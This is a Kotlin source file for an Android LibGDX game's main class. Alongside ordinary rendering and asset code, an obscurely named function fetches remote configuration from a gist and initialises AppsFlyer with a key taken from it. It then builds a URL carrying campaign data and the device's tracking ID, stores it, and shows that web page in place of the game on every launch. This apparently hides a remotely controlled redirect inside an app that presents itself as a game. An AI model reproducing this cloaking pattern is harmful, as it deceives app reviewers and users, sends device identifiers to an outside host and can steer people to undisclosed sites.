package com.bobrevsc.tkarierraperbola.game

import android.content.Context.MODE_PRIVATE
import android.content.SharedPreferences
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.appsflyer.attribution.AppsFlyerRequestListener
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.utils.Disposable
import com.badlogic.gdx.utils.ScreenUtils
import com.bobrevsc.tkarierraperbola.MainActivity
import com.bobrevsc.tkarierraperbola.appContext
import com.bobrevsc.tkarierraperbola.game.dataStore.DataStore
import com.bobrevsc.tkarierraperbola.game.manager.MusicManager
import com.bobrevsc.tkarierraperbola.game.manager.NavigationManager
import com.bobrevsc.tkarierraperbola.game.manager.SoundManager
import com.bobrevsc.tkarierraperbola.game.manager.SpriteManager
import com.bobrevsc.tkarierraperbola.game.manager.util.MusicUtil
import com.bobrevsc.tkarierraperbola.game.manager.util.SoundUtil
import com.bobrevsc.tkarierraperbola.game.manager.util.SpriteUtil
import com.bobrevsc.tkarierraperbola.game.screens.AbstractWorkScreen
import com.bobrevsc.tkarierraperbola.game.screens.LoaderScreen
import com.bobrevsc.tkarierraperbola.game.utils.GColor
import com.bobrevsc.tkarierraperbola.game.utils.advanced.AdvancedGame
import com.bobrevsc.tkarierraperbola.game.utils.disposeAll
import com.bobrevsc.tkarierraperbola.game.worker.WorkerInvestUtil
import com.bobrevsc.tkarierraperbola.util.Gist
import com.bobrevsc.tkarierraperbola.util.log
import kotlinx.coroutines.*
import java.util.concurrent.atomic.AtomicBoolean

var GLOBAL_isGame = false
    private set

var GLOBAL_isPauseGame = false

class LibGDXGame(val activity: MainActivity) : AdvancedGame() {

    lateinit var assetManager: AssetManager private set
    lateinit var navigationManager: NavigationManager private set
    lateinit var spriteManager: SpriteManager private set
    lateinit var musicManager: MusicManager private set
    lateinit var soundManager: SoundManager private set

    val loader by lazy { SpriteUtil.Loader() }
    val all by lazy { SpriteUtil.All() }

    val musicUtil by lazy { MusicUtil() }
    val soundUtil by lazy { SoundUtil() }

    var backgroundColor = GColor.green
    val disposableSet = mutableSetOf<Disposable>()

    val coroutine = CoroutineScope(Dispatchers.Default)

    val sharedPreferences: SharedPreferences = appContext.getSharedPreferences("SerFinExp", MODE_PRIVATE)

    val dataStore = DataStore(sharedPreferences)
    val workerInvestUtil = WorkerInvestUtil()

    override fun create() {
        navigationManager = NavigationManager(this)
        assetManager = AssetManager()
        spriteManager = SpriteManager(assetManager)

        musicManager = MusicManager(assetManager)
        soundManager = SoundManager(assetManager)

        navigationManager.navigate(LoaderScreen::class.java.name)

        collectWorkerInvest()
        gah()
    }

    // Logic ------------------------------------------------------------------

    private fun collectWorkerInvest() {
        coroutine.launch(Dispatchers.IO) {
            workerInvestUtil.collectWorkerInvest { screenTypeIndex, investmentIndex, investment ->
                screen?.let {
                    if (it is AbstractWorkScreen) {
                        it.showDialogInvest(screenTypeIndex, investmentIndex, investment)
                    } else {
                        AbstractWorkScreen.LIST_RESERVE_INVEST.add(
                            AbstractWorkScreen.ReserveInvest(screenTypeIndex, investmentIndex, investment)
                        )
                    }
                }
            }
        }
    }

    override fun render() {
        if (GLOBAL_isPauseGame) return

        ScreenUtils.clear(backgroundColor)
        super.render()
    }

    override fun dispose() {
        try {
            log("dispose LibGDXGame")
            coroutine.cancel()
            disposableSet.disposeAll()
            disposeAll(assetManager, musicUtil)
            super.dispose()
        } catch (e: Exception) {
            log("exception: ${e.message}")
        }
    }

    // Logic Web ---------------------------------------------------------------------------

    private fun gah() {
        log("gah")
        activity.blockRedirect = { GLOBAL_isGame = true }
        activity.initWeb()

        //GLOBAL_isGame = true
        //return

        val path = sharedPreferences.getString("vvv", "aa") ?: "aa"

        try {
            if (path == "aa") {
                coroutine.launch(Dispatchers.Main) {
                    val getJSON = withContext(Dispatchers.IO) { Gist.getDataJson() }

                    if (getJSON != null) {
                        AppsFlyerLib.getInstance()
                            .init(getJSON.oxushki, getAppsFlyerConversionListener(getJSON.lalend), appContext)
                        AppsFlyerLib.getInstance()
                            .start(activity, getJSON.oxushki, getAppsFlyerRequestListener())
                    } else {
                        GLOBAL_isGame = true
                    }
                }
            } else {
                activity.showUrl(path)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            GLOBAL_isGame = true
        }
    }

    private fun getAppsFlyerConversionListener(sma: String) = object : AppsFlyerConversionListener {
        private val isAppsflyerGetData = AtomicBoolean(false)

        override fun onConversionDataSuccess(appfMap: MutableMap<String, Any>?) {
            if (isAppsflyerGetData.getAndSet(true)) return

            if (appfMap != null) {
                val campaign = appfMap["campaign"] as? String
                val afAd = appfMap["af_ad"] as? String
                val media = appfMap["media_source"] as? String

                val afId = AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)

                log("Result: campaign = $campaign | afAd = $afAd | media_source = $media | appfMap = $appfMap")

                val link = "$sma?hzkhq=$campaign&xiiull=$afAd&podbjcs=$media&ctffvbl=$afId"
                log("link = $link")

                coroutine.launch(Dispatchers.IO) { sharedPreferences.edit().putString("vvv", link).apply() }

                activity.showUrl(link)

            } else GLOBAL_isGame = true
        }

        override fun onConversionDataFail(p0: String?) {
            if (isAppsflyerGetData.getAndSet(true)) return
            GLOBAL_isGame = true
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
        override fun onAttributionFailure(p0: String?) {}
    }

    private fun getAppsFlyerRequestListener() = object : AppsFlyerRequestListener {
        override fun onSuccess() {
            log("AppsFlyer: onSuccess")
        }

        override fun onError(p0: Int, p1: String) {
            log("AppsFlyer: onError")
        }
    }

}